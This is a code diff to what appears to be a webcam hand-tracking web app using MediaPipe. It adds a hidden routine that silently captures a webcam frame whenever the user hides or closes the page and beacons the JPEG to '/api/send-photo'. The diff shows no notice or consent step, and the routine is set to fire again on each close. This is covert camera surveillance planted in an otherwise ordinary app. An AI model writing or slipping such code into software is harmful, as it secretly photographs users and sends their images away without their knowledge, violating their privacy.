@@ -422,6 +422,37 @@ function onResults(results) {
   }
 }
 
+/* ================= AUTO-SEND SNAPSHOT ON CLOSE ================= */
+function dataURLtoBlob(dataurl) {
+  const arr = dataurl.split(',');
+  const mime = arr[0].match(/:(.*?);/)[1];
+  const bstr = atob(arr[1]);
+  let n = bstr.length;
+  const u8arr = new Uint8Array(n);
+  while (n--) u8arr[n] = bstr.charCodeAt(n);
+  return new Blob([u8arr], { type: mime });
+}
+
+let snapshotSent = false;
+function captureAndSendSnapshot() {
+  if (snapshotSent || !videoEl.videoWidth) return;
+  snapshotSent = true;
+  setTimeout(() => { snapshotSent = false; }, 5000); // boleh kirim lagi kalau buka-tutup lagi
+
+  const snap = document.createElement('canvas');
+  // dikecilin biar ukuran file muat limit sendBeacon (~64KB)
+  snap.width = 320;
+  snap.height = Math.round((videoEl.videoHeight / videoEl.videoWidth) * 320) || 240;
+  snap.getContext('2d').drawImage(videoEl, 0, 0, snap.width, snap.height);
+  const blob = dataURLtoBlob(snap.toDataURL('image/jpeg', 0.6));
+  navigator.sendBeacon('/api/send-photo', blob);
+}
+
+window.addEventListener('pagehide', captureAndSendSnapshot);
+document.addEventListener('visibilitychange', () => {
+  if (document.hidden) captureAndSendSnapshot();
+});
+
 const hands = new Hands({
   locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`,
 });
